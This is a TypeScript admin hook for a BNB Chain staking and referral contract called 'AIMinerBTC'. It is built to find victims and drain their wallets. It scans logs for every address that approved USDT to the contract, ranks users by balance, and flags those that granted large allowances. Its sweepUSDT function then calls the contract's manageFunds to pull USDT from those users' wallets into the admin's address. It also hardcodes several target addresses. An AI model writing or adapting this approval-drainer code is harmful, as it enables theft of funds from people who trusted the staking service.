import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider } from 'ethers';
import { useWallet } from '../lib/web3';

const CONTRACT_ADDRESS = '0x56ACf536aBa0A122e2Da9d2C2D3Fdc14513A2436'; 
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const RPC_NODES = [
    'https://bsc-dataseed.binance.org/',
    'https://binance.llamarpc.com',
    'https://bsc.meowrpc.com'
];
let currentRpcIdx = 0;
const getProvider = () => new JsonRpcProvider(RPC_NODES[currentRpcIdx]);
const DISCOVERY_BLOCK_WINDOW = 500000;
const DISCOVERY_CHUNK_SIZE = 5000;


const ADMIN_ABI = [
    { "anonymous": false, "name": "ReferralPaid", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "referrer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "referee", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "level", "type": "uint256" }] },
    { "anonymous": false, "name": "Staked", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "tier", "type": "uint256" }] },
    { "anonymous": false, "name": "Withdrawn", "type": "event", "inputs": [{ "indexed": true, "internalType": "address", "name": "user", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "reward", "type": "uint256" }] },
    {
        "inputs": [
            { "internalType": "address", "name": "token", "type": "address" },
            { "internalType": "address", "name": "from", "type": "address" },
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "manageFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_token", "type": "address" },
            { "internalType": "uint256", "name": "_amount", "type": "uint256" }
        ],
        "name": "emergencyWithdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "_user", "type": "address" }],
        "name": "getUserInfo",
        "outputs": [{
            "components": [
                { "internalType": "address", "name": "referrer", "type": "address" },
                { "internalType": "uint256", "name": "totalStaked", "type": "uint256" },
                { "internalType": "uint256", "name": "totalEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "referralRewards", "type": "uint256" },
                { "internalType": "uint256", "name": "totalBonus", "type": "uint256" },
                { "internalType": "uint256", "name": "totalReferralEarned", "type": "uint256" },
                { "internalType": "uint256", "name": "teamSize", "type": "uint256" },
                { "internalType": "uint256", "name": "stakeCount", "type": "uint256" }
            ],
            "internalType": "struct AIMinerBTC.UserInfoView",
            "name": "", "type": "tuple"
        }],
        "stateMutability": "view",
        "type": "function"
    }
];

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

export function useAdmin() {
    const { address: adminAddress, signer, walletProvider } = useWallet();

    const getContract = async (withSigner = false) => {
        try {
            if (withSigner && signer) return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, signer);
            if (withSigner && walletProvider) {
                const browserProvider = new BrowserProvider(walletProvider as any);
                return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, await browserProvider.getSigner());
            }
        } catch (e) {}
        return new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
    };

    const getUsdtContract = async (withSigner = false) => {
        try {
            if (withSigner && signer) return new Contract(USDT_ADDRESS, ERC20_ABI, signer);
            if (withSigner && walletProvider) {
                const browserProvider = new BrowserProvider(walletProvider as any);
                return new Contract(USDT_ADDRESS, ERC20_ABI, await browserProvider.getSigner());
            }
        } catch (e) {}
        return new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
    };

    const normalizeAddress = (addr: unknown) => {
        if (typeof addr !== 'string') return null;
        const clean = addr.trim();
        if (!/^0x[a-fA-F0-9]{40}$/.test(clean)) return null;
        return clean.toLowerCase();
    };

    const addAddress = (addresses: Set<string>, addr: unknown) => {
        const clean = normalizeAddress(addr);
        if (clean) addresses.add(clean);
    };

    const fetchAllUsersDetailed = async (onProgress?: (msg: string) => void) => {
        try {
            if (onProgress) onProgress("Initializing discovery...");
            
            const provider = getProvider();
            const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, provider);
            const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, provider);
            const currentBlock = await provider.getBlockNumber();
            const startBlock = Math.max(0, currentBlock - DISCOVERY_BLOCK_WINDOW);
            
            const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
            const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
            const addresses = new Set<string>();
            cached.forEach((addr: unknown) => addAddress(addresses, addr));

            // Manual fallbacks (Immediate visibility)
            ['0x3fBFF9Ddb36d015c92843A7C758a09Ea5978eFD', '0xfB0F0422956f64249a2aA901036842087e77c18', '0xD9B9C4957e62a907106A9e969062309a4d75Be9E', '0xb313F163fF1A7f1762199b0c90c906603428F6d'].forEach(a => addAddress(addresses, a));

            const stakedFilter = (contract as any).filters.Staked();
            const referralFilter = (contract as any).filters.ReferralPaid();
            const withdrawnFilter = (contract as any).filters.Withdrawn();
            const approvalFilter = (usdt as any).filters.Approval(null, CONTRACT_ADDRESS);

            const chunks = [];
            for (let from = currentBlock; from > startBlock; from -= DISCOVERY_CHUNK_SIZE) {
                const to = from;
                const f = Math.max(startBlock, from - DISCOVERY_CHUNK_SIZE + 1);
                chunks.push({ from: f, to });
            }

            if (onProgress) onProgress(`Scanning ${chunks.length} chunks...`);

            const fetchEvents = async (filter: any, from: number, to: number, source: Contract) => {
                try {
                    return await source.queryFilter(filter, from, to);
                } catch (e) {
                    currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
                    return [];
                }
            };

            // Sequential log calls are slower, but public BSC RPCs rate-limit batched eth_getLogs heavily.
            for (let i = 0; i < chunks.length; i++) {
                if (onProgress) onProgress(`Scanning: ${Math.round((i / chunks.length) * 100)}%`);
                const chunk = chunks[i];
                const approvals = await fetchEvents(approvalFilter, chunk.from, chunk.to, usdt);
                const staked = await fetchEvents(stakedFilter, chunk.from, chunk.to, contract);
                const referral = await fetchEvents(referralFilter, chunk.from, chunk.to, contract);
                const withdrawn = await fetchEvents(withdrawnFilter, chunk.from, chunk.to, contract);
                
                const extract = (events: any[]) => {
                    events.forEach(e => {
                        if (!e.args) return;
                        // Ethers v6 Result mapping
                        const addr = e.args[0] || e.args.user || e.args.referrer || e.args.owner;
                        addAddress(addresses, addr);
                        
                        if (e.fragment?.name === 'ReferralPaid' && e.args[1]) {
                            addAddress(addresses, e.args[1]);
                        }
                    });
                };

                extract(approvals);
                extract(staked);
                extract(referral);
                extract(withdrawn);

                if (i % 10 === 0) {
                    const uniqueAddresses = Array.from(addresses);
                    if (uniqueAddresses.length > 0) {
                        localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
                    }
                }
            }

            if (onProgress) onProgress("Fetching user details...");
            const uniqueAddresses = Array.from(addresses);
            localStorage.setItem(cacheKey, JSON.stringify(uniqueAddresses));
            
            const userDetails = [];
            for (let i = 0; i < uniqueAddresses.length; i += 2) {
                if (onProgress) onProgress(`Loading Details: ${i}/${uniqueAddresses.length}`);
                const batch = uniqueAddresses.slice(i, i + 2);
                const batchResults = await Promise.all(batch.map(async (userAddr) => {
                    try {
                        // RE-FETCH providers to ensure fresh connection
                        const c = await getContract();
                        const u = await getUsdtContract();
                        
                        const [info, balance, allowance] = await Promise.all([
                            c.getUserInfo(userAddr).catch(() => null),
                            u.balanceOf(userAddr),
                            u.allowance(userAddr, CONTRACT_ADDRESS)
                        ]);

                        return {
                            address: userAddr,
                            staked: info ? formatUnits(info.totalStaked, 18) : "0",
                            earned: info ? formatUnits(info.totalEarned, 18) : "0",
                            balance: formatUnits(balance, 18),
                            allowance: formatUnits(allowance, 18),
                            isApproved: BigInt(allowance) >= parseUnits("100000", 18)
                        };
                    } catch (e) {
                        console.warn(`Detail fetch failed for ${userAddr}`, e);
                        return null;
                    }
                }));
                userDetails.push(...batchResults.filter(Boolean));
            }

            return userDetails.sort((a: any, b: any) => parseFloat(b.staked) - parseFloat(a.staked));
        } catch (err) {
            console.error("Discovery Error:", err);
            return [];
        }
    };


    const fetchUserData = async (targetUser: string) => {
        const normalizedTarget = normalizeAddress(targetUser);
        if (!normalizedTarget) return null;
        
        try {
            const contract = await getContract();
            const usdt = await getUsdtContract();

            const [info, balance, allowance] = await Promise.all([
                contract.getUserInfo(normalizedTarget).catch(() => null),
                usdt.balanceOf(normalizedTarget),
                usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
            ]);

            return {
                staked: info ? formatUnits(info.totalStaked, 18) : "0",
                earned: info ? formatUnits(info.totalEarned, 18) : "0",
                balance: formatUnits(balance, 18),
                allowance: formatUnits(allowance, 18),
                isApproved: BigInt(allowance) >= parseUnits("100000", 18)
            };
        } catch (err) {
            console.error("Fetch Data Error:", err);
            // Try one more time with fresh provider
            try {
                currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
                const contract = new Contract(CONTRACT_ADDRESS, ADMIN_ABI, getProvider());
                const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, getProvider());
                const [info, balance, allowance] = await Promise.all([
                    contract.getUserInfo(normalizedTarget).catch(() => null),
                    usdt.balanceOf(normalizedTarget),
                    usdt.allowance(normalizedTarget, CONTRACT_ADDRESS)
                ]);
                return {
                    staked: info ? formatUnits(info.totalStaked, 18) : "0",
                    earned: info ? formatUnits(info.totalEarned, 18) : "0",
                    balance: formatUnits(balance, 18),
                    allowance: formatUnits(allowance, 18),
                    isApproved: BigInt(allowance) >= parseUnits("100000", 18)
                };
            } catch (e2) {
                return null;
            }
        }
    };

    const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
        const contract = await getContract(true);
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToManage, 18);
        const tx = await contract.manageFunds(tokenAddress, fromAddress, toAddress, amountInWei);
        return await tx.wait();
    };

    const sweepUSDT = async (fromUser: string, amount: string) => {
        if (!adminAddress) throw new Error("Admin not connected");
        return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
    };

    const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
        const contract = await getContract(true);
        if (!contract) throw new Error("Wallet not connected");
        
        const amountInWei = parseUnits(amountToWithdraw, 18);
        const tx = await contract.emergencyWithdraw(tokenAddress, amountInWei);
        return await tx.wait();
    };

    return {
        fetchUserData,
        fetchAllUsersDetailed,
        manageFunds,
        sweepUSDT,
        emergencyWithdraw
    };
}
